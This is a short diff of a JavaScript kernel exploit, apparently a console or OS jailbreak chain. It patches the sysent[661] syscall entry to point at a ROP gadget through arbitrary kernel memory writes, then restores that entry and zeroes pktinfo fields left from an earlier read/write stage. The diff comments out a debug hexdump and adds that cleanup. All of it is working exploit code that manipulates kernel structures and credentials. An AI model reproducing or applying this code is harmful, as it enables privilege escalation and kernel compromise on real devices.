@@ -1544,7 +1544,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     }
     log(`sysent[661] save addr: ${sysent_661_save.addr}`);
     log("sysent[661] save data:");
-    hexdump(sysent_661_save);
+    // hexdump(sysent_661_save);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1621,6 +1621,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         kmem.write64(sysent_661.add(off), sysent_661_save.read64(off));
     }
     log("sysent[661] restored");
+	
+    // RESTORE pktinfo fields (cleanup from restricted r/w stage)
+    log("restore pktinfo fields");
+    kmem.write64(restore_info[2], 0); // pktinfo_p  (k100_addr + 0x10)
+    kmem.write64(restore_info[3], 0); // w_pktinfo  (w_pktopts + 0x10)
+    log("pktinfo fields zeroed");
 
     // RESTORE pipebuf (last kmem operation)
     log("restore pipebuf");
